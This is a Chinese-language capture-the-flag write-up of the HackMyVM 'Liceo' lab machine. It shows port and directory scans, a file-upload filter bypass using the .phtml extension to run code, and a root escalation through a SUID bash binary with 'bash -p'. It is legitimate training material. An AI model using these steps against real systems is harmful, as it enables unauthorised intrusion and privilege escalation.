---
sidebar_position: 4
tags: [Easy, Linux, 文件上传, SUID]
title: Liceo
description: Liceo
---
# Liceo
## 端口扫描
```bash
──(root㉿kali)-[~/CTF/HackerMyVM]
└─# nmap -sTCV -p- --min-rate 1000 192.168.0.105   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 08:56 EDT
Nmap scan report for 192.168.0.105 (192.168.0.105)
Host is up (0.019s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.104
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000          191 Feb 01 14:29 note.txt
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:4c:42:8d:10:2c:61:56:7b:26:c4:78:96:6d:28:15 (ECDSA)
|_  256 7e:1a:29:d8:9b:91:44:bd:66:ff:6a:f3:2b:c7:35:65 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Liceo
MAC Address: 08:00:27:9B:FC:34 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.79 seconds
```
从扫描结果中可以看到存在一个 FTP 匿名身份登陆, 那个文件没有什么内容
## HTTP - 80
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# gobuster dir -u http://liceo.com/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://liceo.com/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 274]
/images               (Status: 301) [Size: 307] [--> http://liceo.com/images/]
/.html                (Status: 403) [Size: 274]
/index.html           (Status: 200) [Size: 21487]
/uploads              (Status: 301) [Size: 308] [--> http://liceo.com/uploads/]
/upload.php           (Status: 200) [Size: 371]
/server-status        (Status: 403) [Size: 274]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```
从端口扫描的结果中可以看到两个内容 `uploads` `upload.php` 很明显就是利用文件上传来攻击, 直接上传 `php` 显示黑名单之后进行尝试发现 `.phtml` 可以上传成功并执行
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240414210728.png)
## 后渗透
### www-data --> root
上传脚本进行执行发现一个特殊的 SUID 程序
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240414212117.png)
```bash
(remote) www-data@liceoserver:/var/tmp$ /usr/bin/bash -p
(remote) root@liceoserver:/var/tmp# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```